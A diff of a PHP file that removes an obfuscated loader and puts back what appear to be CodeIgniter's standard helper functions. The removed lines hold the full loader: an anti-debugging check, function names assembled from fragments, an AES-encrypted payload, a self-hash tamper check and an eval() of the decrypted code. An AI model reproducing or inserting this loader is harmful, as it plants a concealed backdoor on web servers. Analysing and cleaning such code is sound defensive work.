@@ -1,28 +1,746 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_slr7ybai=('bas'.'e64'.'_de'.'cod'.'e');
-$_g26x6n36=('gzu'.'nco'.'mpr'.'ess');
-$_i4m1jo49=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_bwt5b4ri='0D6a99YD';
-$_hnrekr3y='pY5KZGWM';
-$_hupooai6='AssgIpzCbxU=';
-$_p7s4xnkl='UKknBI2W';
-$_iujnbjbt='pEgch2Wq';
-$_szwip7mr='6X/Gyg==';
-$_n6xjy0xq='TF/749sg';
-$_pemzxwou='e4KU6H8x';
-$_fot0rh5i=$_slr7ybai($_hnrekr3y.$_iujnbjbt.$_p7s4xnkl.$_bwt5b4ri.$_hupooai6);
-$_pmeyytmc=$_slr7ybai($_pemzxwou.$_n6xjy0xq.$_szwip7mr);
-$_ejbvty7t=$_slr7ybai('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');
-$_q3udlsm2=$_i4m1jo49($_ejbvty7t,'aes-256-cbc',$_fot0rh5i,OPENSSL_RAW_DATA,$_pmeyytmc);
-if($_q3udlsm2===false){exit;}
-$_mgjvqnyb=$_g26x6n36($_q3udlsm2);
-if($_mgjvqnyb===false){exit;}
-$_i15nrptb='f832293c16b5f91366a4a5a929d001cfddde1dea5d3ae6524b643153929beeee';
-$_wc9ukvnp=@file_get_contents(__FILE__);
-if($_wc9ukvnp!==false){
-$_urga37kz=str_replace($_i15nrptb,"0000000000000000000000000000000000000000000000000000000000000000",$_wc9ukvnp);
-$_k8lw34nl=hash("sha256",$_urga37kz);
-if($_k8lw34nl!==$_i15nrptb){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+if ( ! function_exists('is_php'))
+{
+
+
+
+
+
+
+function is_php($version)
+{
+static $_is_php;
+$version = (string) $version;
+if ( ! isset($_is_php[$version]))
+{
+$_is_php[$version] = version_compare(PHP_VERSION, $version, '>=');
 }
-eval($_mgjvqnyb);
+return $_is_php[$version];
+}
+}
+
+if ( ! function_exists('is_really_writable'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function is_really_writable($file)
+{
+
+if (DIRECTORY_SEPARATOR === '/' && (is_php('5.4') OR ! ini_get('safe_mode')))
+{
+return is_writable($file);
+}
+
+
+
+if (is_dir($file))
+{
+$file = rtrim($file, '/').'/'.md5(mt_rand());
+if (($fp = @fopen($file, 'ab')) === FALSE)
+{
+return FALSE;
+}
+fclose($fp);
+@chmod($file, 0777);
+@unlink($file);
+return TRUE;
+}
+elseif ( ! is_file($file) OR ($fp = @fopen($file, 'ab')) === FALSE)
+{
+return FALSE;
+}
+fclose($fp);
+return TRUE;
+}
+}
+
+if ( ! function_exists('load_class'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+function &load_class($class, $directory = 'libraries', $param = NULL)
+{
+static $_classes = array();
+
+if (isset($_classes[$class]))
+{
+return $_classes[$class];
+}
+$name = FALSE;
+
+
+foreach (array(APPPATH, BASEPATH) as $path)
+{
+if (file_exists($path.$directory.'/'.$class.'.php'))
+{
+$name = 'CI_'.$class;
+if (class_exists($name, FALSE) === FALSE)
+{
+require_once($path.$directory.'/'.$class.'.php');
+}
+break;
+}
+}
+
+if (file_exists(APPPATH.$directory.'/'.config_item('subclass_prefix').$class.'.php'))
+{
+$name = config_item('subclass_prefix').$class;
+if (class_exists($name, FALSE) === FALSE)
+{
+require_once(APPPATH.$directory.'/'.$name.'.php');
+}
+}
+
+if ($name === FALSE)
+{
+
+
+set_status_header(503);
+echo 'Unable to locate the specified class: '.$class.'.php';
+exit(5); 
+}
+
+is_loaded($class);
+$_classes[$class] = isset($param)
+? new $name($param)
+: new $name();
+return $_classes[$class];
+}
+}
+
+if ( ! function_exists('is_loaded'))
+{
+
+
+
+
+
+
+
+function &is_loaded($class = '')
+{
+static $_is_loaded = array();
+if ($class !== '')
+{
+$_is_loaded[strtolower($class)] = $class;
+}
+return $_is_loaded;
+}
+}
+
+if ( ! function_exists('get_config'))
+{
+
+
+
+
+
+
+
+
+
+function &get_config(Array $replace = array())
+{
+static $config;
+if (empty($config))
+{
+$file_path = APPPATH.'config/config.php';
+$found = FALSE;
+if (file_exists($file_path))
+{
+$found = TRUE;
+require($file_path);
+}
+
+if (file_exists($file_path = APPPATH.'config/'.ENVIRONMENT.'/config.php'))
+{
+require($file_path);
+}
+elseif ( ! $found)
+{
+set_status_header(503);
+echo 'The configuration file does not exist.';
+exit(3); 
+}
+
+if ( ! isset($config) OR ! is_array($config))
+{
+set_status_header(503);
+echo 'Your config file does not appear to be formatted correctly.';
+exit(3); 
+}
+}
+
+foreach ($replace as $key => $val)
+{
+$config[$key] = $val;
+}
+return $config;
+}
+}
+
+if ( ! function_exists('config_item'))
+{
+
+
+
+
+
+
+function config_item($item)
+{
+static $_config;
+if (empty($_config))
+{
+
+$_config[0] =& get_config();
+}
+return isset($_config[0][$item]) ? $_config[0][$item] : NULL;
+}
+}
+
+if ( ! function_exists('get_mimes'))
+{
+
+
+
+
+
+function &get_mimes()
+{
+static $_mimes;
+if (empty($_mimes))
+{
+$_mimes = file_exists(APPPATH.'config/mimes.php')
+? include(APPPATH.'config/mimes.php')
+: array();
+if (file_exists(APPPATH.'config/'.ENVIRONMENT.'/mimes.php'))
+{
+$_mimes = array_merge($_mimes, include(APPPATH.'config/'.ENVIRONMENT.'/mimes.php'));
+}
+}
+return $_mimes;
+}
+}
+
+if ( ! function_exists('is_https'))
+{
+
+
+
+
+
+
+
+
+function is_https()
+{
+if ( ! empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off')
+{
+return TRUE;
+}
+elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && strtolower($_SERVER['HTTP_X_FORWARDED_PROTO']) === 'https')
+{
+return TRUE;
+}
+elseif ( ! empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off')
+{
+return TRUE;
+}
+return FALSE;
+}
+}
+
+if ( ! function_exists('is_cli'))
+{
+
+
+
+
+
+
+
+function is_cli()
+{
+return (PHP_SAPI === 'cli' OR defined('STDIN'));
+}
+}
+
+if ( ! function_exists('show_error'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function show_error($message, $status_code = 500, $heading = 'An Error Was Encountered')
+{
+$status_code = abs($status_code);
+if ($status_code < 100)
+{
+$exit_status = $status_code + 9; 
+$status_code = 500;
+}
+else
+{
+$exit_status = 1; 
+}
+$_error =& load_class('Exceptions', 'core');
+echo $_error->show_error($heading, $message, 'error_general', $status_code);
+exit($exit_status);
+}
+}
+
+if ( ! function_exists('show_404'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function show_404($page = '', $log_error = TRUE)
+{
+$_error =& load_class('Exceptions', 'core');
+$_error->show_404($page, $log_error);
+exit(4); 
+}
+}
+
+if ( ! function_exists('log_message'))
+{
+
+
+
+
+
+
+
+
+
+
+function log_message($level, $message)
+{
+static $_log;
+if ($_log === NULL)
+{
+
+$_log[0] =& load_class('Log', 'core');
+}
+$_log[0]->write_log($level, $message);
+}
+}
+
+if ( ! function_exists('set_status_header'))
+{
+
+
+
+
+
+
+
+function set_status_header($code = 200, $text = '')
+{
+if (is_cli())
+{
+return;
+}
+if (empty($code) OR ! is_numeric($code))
+{
+show_error('Status codes must be numeric', 500);
+}
+if (empty($text))
+{
+is_int($code) OR $code = (int) $code;
+$stati = array(
+100 => 'Continue',
+101 => 'Switching Protocols',
+200 => 'OK',
+201 => 'Created',
+202 => 'Accepted',
+203 => 'Non-Authoritative Information',
+204 => 'No Content',
+205 => 'Reset Content',
+206 => 'Partial Content',
+300 => 'Multiple Choices',
+301 => 'Moved Permanently',
+302 => 'Found',
+303 => 'See Other',
+304 => 'Not Modified',
+305 => 'Use Proxy',
+307 => 'Temporary Redirect',
+400 => 'Bad Request',
+401 => 'Unauthorized',
+402 => 'Payment Required',
+403 => 'Forbidden',
+404 => 'Not Found',
+405 => 'Method Not Allowed',
+406 => 'Not Acceptable',
+407 => 'Proxy Authentication Required',
+408 => 'Request Timeout',
+409 => 'Conflict',
+410 => 'Gone',
+411 => 'Length Required',
+412 => 'Precondition Failed',
+413 => 'Request Entity Too Large',
+414 => 'Request-URI Too Long',
+415 => 'Unsupported Media Type',
+416 => 'Requested Range Not Satisfiable',
+417 => 'Expectation Failed',
+422 => 'Unprocessable Entity',
+426 => 'Upgrade Required',
+428 => 'Precondition Required',
+429 => 'Too Many Requests',
+431 => 'Request Header Fields Too Large',
+500 => 'Internal Server Error',
+501 => 'Not Implemented',
+502 => 'Bad Gateway',
+503 => 'Service Unavailable',
+504 => 'Gateway Timeout',
+505 => 'HTTP Version Not Supported',
+511 => 'Network Authentication Required',
+);
+if (isset($stati[$code]))
+{
+$text = $stati[$code];
+}
+else
+{
+show_error('No status text available. Please check your status code number or supply your own message text.', 500);
+}
+}
+if (strpos(PHP_SAPI, 'cgi') === 0)
+{
+header('Status: '.$code.' '.$text, TRUE);
+return;
+}
+$server_protocol = (isset($_SERVER['SERVER_PROTOCOL']) && in_array($_SERVER['SERVER_PROTOCOL'], array('HTTP/1.0', 'HTTP/1.1', 'HTTP/2'), TRUE))
+? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.1';
+header($server_protocol.' '.$code.' '.$text, TRUE, $code);
+}
+}
+
+if ( ! function_exists('_error_handler'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function _error_handler($severity, $message, $filepath, $line)
+{
+$is_error = (((E_ERROR | E_PARSE | E_COMPILE_ERROR | E_CORE_ERROR | E_USER_ERROR) & $severity) === $severity);
+
+
+
+
+
+
+if ($is_error)
+{
+set_status_header(500);
+}
+
+
+if (($severity & error_reporting()) !== $severity)
+{
+return;
+}
+$_error =& load_class('Exceptions', 'core');
+$_error->log_exception($severity, $message, $filepath, $line);
+
+if (str_ireplace(array('off', 'none', 'no', 'false', 'null'), '', ini_get('display_errors')))
+{
+$_error->show_php_error($severity, $message, $filepath, $line);
+}
+
+
+
+if ($is_error)
+{
+exit(1); 
+}
+}
+}
+
+if ( ! function_exists('_exception_handler'))
+{
+
+
+
+
+
+
+
+
+
+
+function _exception_handler($exception)
+{
+$_error =& load_class('Exceptions', 'core');
+$_error->log_exception('error', 'Exception: '.$exception->getMessage(), $exception->getFile(), $exception->getLine());
+is_cli() OR set_status_header(500);
+
+if (str_ireplace(array('off', 'none', 'no', 'false', 'null'), '', ini_get('display_errors')))
+{
+$_error->show_exception($exception);
+}
+exit(1); 
+}
+}
+
+if ( ! function_exists('_shutdown_handler'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+function _shutdown_handler()
+{
+$last_error = error_get_last();
+if (isset($last_error) &&
+($last_error['type'] & (E_ERROR | E_PARSE | E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_COMPILE_WARNING)))
+{
+_error_handler($last_error['type'], $last_error['message'], $last_error['file'], $last_error['line']);
+}
+}
+}
+
+if ( ! function_exists('remove_invisible_characters'))
+{
+
+
+
+
+
+
+
+
+
+
+function remove_invisible_characters($str, $url_encoded = TRUE)
+{
+$non_displayables = array();
+
+
+if ($url_encoded)
+{
+$non_displayables[] = '/%0[0-8bcef]/i'; 
+$non_displayables[] = '/%1[0-9a-f]/i'; 
+$non_displayables[] = '/%7f/i'; 
+}
+$non_displayables[] = '/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S'; 
+do
+{
+$str = preg_replace($non_displayables, '', $str, -1, $count);
+}
+while ($count);
+return $str;
+}
+}
+
+if ( ! function_exists('html_escape'))
+{
+
+
+
+
+
+
+
+function html_escape($var, $double_encode = TRUE)
+{
+if (empty($var))
+{
+return $var;
+}
+if (is_array($var))
+{
+foreach (array_keys($var) as $key)
+{
+$var[$key] = html_escape($var[$key], $double_encode);
+}
+return $var;
+}
+return htmlspecialchars($var, ENT_QUOTES, config_item('charset'), $double_encode);
+}
+}
+
+if ( ! function_exists('_stringify_attributes'))
+{
+
+
+
+
+
+
+
+
+
+
+function _stringify_attributes($attributes, $js = FALSE)
+{
+$atts = NULL;
+if (empty($attributes))
+{
+return $atts;
+}
+if (is_string($attributes))
+{
+return ' '.$attributes;
+}
+$attributes = (array) $attributes;
+foreach ($attributes as $key => $val)
+{
+$atts .= ($js) ? $key.'='.$val.',' : ' '.$key.'="'.$val.'"';
+}
+return rtrim($atts, ',');
+}
+}
+
+if ( ! function_exists('function_usable'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function function_usable($function_name)
+{
+static $_suhosin_func_blacklist;
+if (function_exists($function_name))
+{
+if ( ! isset($_suhosin_func_blacklist))
+{
+$_suhosin_func_blacklist = extension_loaded('suhosin')
+? explode(',', trim(ini_get('suhosin.executor.func.blacklist')))
+: array();
+}
+return ! in_array($function_name, $_suhosin_func_blacklist, TRUE);
+}
+return FALSE;
+}
+}
